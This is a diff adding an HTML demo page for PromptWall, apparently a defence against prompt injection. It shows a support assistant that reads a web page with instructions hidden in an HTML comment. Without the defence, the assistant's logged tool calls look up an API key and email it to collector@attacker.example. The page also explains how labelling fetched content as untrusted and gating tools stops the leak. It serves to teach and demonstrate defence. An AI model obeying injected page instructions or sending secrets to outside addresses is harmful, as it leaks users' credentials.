@@ -1,0 +1,97 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>PromptWall demo</title>
+<style>
+  :root { color-scheme: light dark; --bg:#fff; --fg:#111; --mut:#666;
+          --line:#ddd; --bad:#b3261e; --good:#186a3b; --card:#fafafa; }
+  @media (prefers-color-scheme: dark) {
+    :root { --bg:#111; --fg:#eee; --mut:#999; --line:#333;
+            --card:#1a1a1a; --bad:#f2b8b5; --good:#7ddba3; }
+  }
+  body { background:var(--bg); color:var(--fg);
+         font:15px/1.6 system-ui, sans-serif;
+         max-width:60rem; margin:2rem auto; padding:0 1rem; }
+  h1 { font-size:1.5rem; } h2 { font-size:1.1rem; margin-top:2rem; }
+  h3 { font-size:.95rem; margin-bottom:.4rem; }
+  pre { background:var(--card); border:1px solid var(--line); border-radius:6px;
+        padding:.75rem; overflow-x:auto; font-size:13px; }
+  .cols { display:grid; grid-template-columns:1fr 1fr; gap:1rem; }
+  @media (max-width:44rem) { .cols { grid-template-columns:1fr; } }
+  .bad { color:var(--bad); font-weight:600; }
+  .good { color:var(--good); font-weight:600; }
+  code { background:var(--card); padding:.1rem .3rem; border-radius:3px; }
+  p.mut { color:var(--mut); }
+</style>
+
+<h1>PromptWall demo</h1>
+<p class="mut">
+  This page describes what <code>python demo/vulnerable_app/app.py</code>
+  prints. The demo is a terminal program &mdash; it needs no server, no API
+  key and no network. Full detail in
+  <a href="../../WALKTHROUGH.md">WALKTHROUGH.md</a>.
+</p>
+
+<h2>The setup</h2>
+<p>
+  A support assistant with <code>web_fetch</code>, <code>read_document</code>,
+  <code>lookup</code> (internal records, including an API key) and
+  <code>send_email</code>. A user asks for a summary of a page. The page has
+  instructions hidden in an HTML comment, addressed to the assistant rather
+  than to the reader.
+</p>
+
+<h2>Same input, two outcomes</h2>
+<div class="cols">
+  <div>
+    <h3>Without PromptWall</h3>
+<pre>[EXECUTED] web_fetch(url=.../article)
+[EXECUTED] lookup(key=api_key)
+[EXECUTED] send_email(
+    to=collector@attacker.example,
+    body=...)
+
+outcome: <span class="bad">DATA EXFILTRATED</span></pre>
+    <p class="mut">
+      The user sees an ordinary summary. Nothing looks wrong. Every step used
+      a tool the assistant was legitimately given.
+    </p>
+  </div>
+  <div>
+    <h3>With PromptWall</h3>
+<pre>[EXECUTED] web_fetch(url=.../article)
+
+stopped at the input phase:
+  rule tool.invoke_directive (critical)
+  in tool:web_fetch
+risk score: 1.000
+
+outcome: <span class="good">no data left the system</span></pre>
+    <p class="mut">
+      The fetch still runs. Retrieving a page is not the dangerous part.
+    </p>
+  </div>
+</div>
+
+<h2>Why it stops</h2>
+<p>
+  Three things had to fail for the undefended run to leak, and each is broken
+  independently: the fetched page is labelled <strong>untrusted</strong>, so
+  instructions inside it carry no authority whatever they claim; the injected
+  block matches a signature and scores high as instruction-like text; and the
+  <strong>tool gate</strong> refuses <code>send_email</code> outright because
+  its authority traces back to retrieved content.
+</p>
+<p>
+  The third is the one that matters. Detection is probabilistic and an
+  attacker gets unlimited attempts at it. The tool gate is deterministic and
+  does not care how clever the phrasing was.
+</p>
+
+<h2>A clean request is untouched</h2>
+<pre>risk score: 0.070
+outcome: no data left the system
+reply: Here is a summary of the document you asked about.</pre>
+<p class="mut">
+  A defence that only ever says no is easy and useless. The demo fails its own
+  run if a clean request is ever cut.
+</p>
